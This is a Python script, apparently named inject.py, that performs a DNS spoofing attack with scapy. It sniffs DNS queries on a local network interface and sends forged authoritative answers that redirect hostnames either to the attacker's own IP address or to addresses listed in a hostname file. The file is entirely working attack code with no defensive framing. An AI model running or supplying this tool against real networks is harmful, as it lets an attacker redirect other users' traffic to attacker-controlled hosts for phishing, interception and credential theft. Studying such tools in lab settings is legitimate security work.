#!/usr/bin/env python
import sys, getopt
from scapy.all import *
import netifaces

hostnameToIpMapMap={}
filePath=''

def getDefaultIP():
	# defaultIP="172.24.224.78"
	googleDNS='8.8.8.8'
	sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sckt.connect((googleDNS, 80))
	defaultIP = sckt.getsockname()[0]
	sckt.close()
	return defaultIP

def getDefaultInterface():
	defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
	return defaultInterface

def DNS_SPOOF(pkt):
	if pkt.haslayer(DNSQR): # DNS question record
		#This is a response from DNS server. Ignoring.
		# if(pkt[DNS].qr == 1):
		# 	print("This is a response from DNS server. Ignoring.")
		# 	return
		# else:
		# 	pkt[IP].dst='None'
		# 	send(pkt)
		#print("pkt[IP].src =>",pkt[IP].src,", pkt[IP].dst =>",pkt[IP].dst)
		pktHostname=stripWWW(pkt[DNS].qd.qname.decode("utf-8").rstrip("."))
		spoofedIP='';
		if(filePath==None or len(filePath)==0):
			# print("adding default ip")
			spoofedIP=getDefaultIP()
		else:
			if(pktHostname in hostnameToIpMapMap):
				# print("hostname found in file. pktHostname=>",pktHostname)
				spoofedIP=hostnameToIpMapMap[pktHostname]
			else:
				return
		# print("pkt[DNS].qd => ",pkt[DNS].qd)
		# print("Spoofing qtype=>",pkt[DNS].qd.qtype,", txid: ",pkt[DNS].id," hostname: ",pkt[DNS].qd.qname," src: ",pkt[IP].src," dest: ",pkt[IP].dst)
		spoofed_pkt = IP(src=pkt[IP].dst,dst=pkt[IP].src)/\
                      UDP(sport=pkt[UDP].dport,dport=pkt[UDP].sport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=spoofedIP))
		send(spoofed_pkt)
		print("spoofed ",pktHostname, " with IP ",spoofedIP," summary ",pkt.summary())
		# print("spoofed_pkt SENT pkt[IP].src => ",pkt[IP].src,", element[IP].dst=>",pkt[IP].dst," pkt[DNS].id=>",pkt[DNS].id,"qd=>",pkt[DNS].qd.qname,", pkt[DNSRR].rrname=>",pkt[DNS].rrname", pkt[DNSRR].rdata=>",pkt[DNS].rdata)
		# print("******************************\n******************************\n\n")

def getArgs(argv):
	interface=None
	traceFilePath=None
	bfpExpr=None
	try:
  		opts, args = getopt.getopt(argv,"i:h:",["interface=","tracefile="])
	except getopt.GetoptError:
  		print('inject.py -i <interface> -h <path_to_hostname_file>') 
  		sys.exit(2)
	for opt, arg in opts:
		if opt in ("-i", "--interface"):
			interface = arg
		elif opt in ("-h", "--ofile"):
			traceFilePath = arg
	if len(args) == 1:
		bfpExpr = args[0]
	return interface,traceFilePath,bfpExpr

def stripWWW(url):
	if("www." in url):
			url=url[4:]
	return url

def readFile(path):
	global hostnameToIpMap
	hostnameToIpMap={}
	fil=open(path,"r")
	for line in fil:
		line=line.strip().split(" ")
		ip=line[0]
		hostname=stripWWW(line[-1])
		hostnameToIpMap[hostname]=ip
	# print("hostnameToIpMap =>",hostnameToIpMap)
	fil.close()
	return hostnameToIpMap


def main(argv):
	interface,fp,bfpExpr=getArgs(argv)
	global filePath
	filePath=fp
	# print("interface =>",interface,", filePath=>",filePath,", bfpExpr=>",bfpExpr)
	if(bfpExpr == None):
		bfpExpr='udp port 53'
	if(interface == None):	
		interface=getDefaultInterface()
	print("bfpExpr =>",bfpExpr,", interface=>",interface)
	if(filePath!=None):
		global hostnameToIpMapMap
		hostnameToIpMapMap=readFile(filePath)
	if(bfpExpr==None):
		sniff(filter=bfpExpr, iface=interface, store=0, prn=DNS_SPOOF)
	else:
		sniff(filter=bfpExpr, iface=interface, store=0, prn=DNS_SPOOF)


if __name__ == '__main__':
	main(sys.argv[1:])







	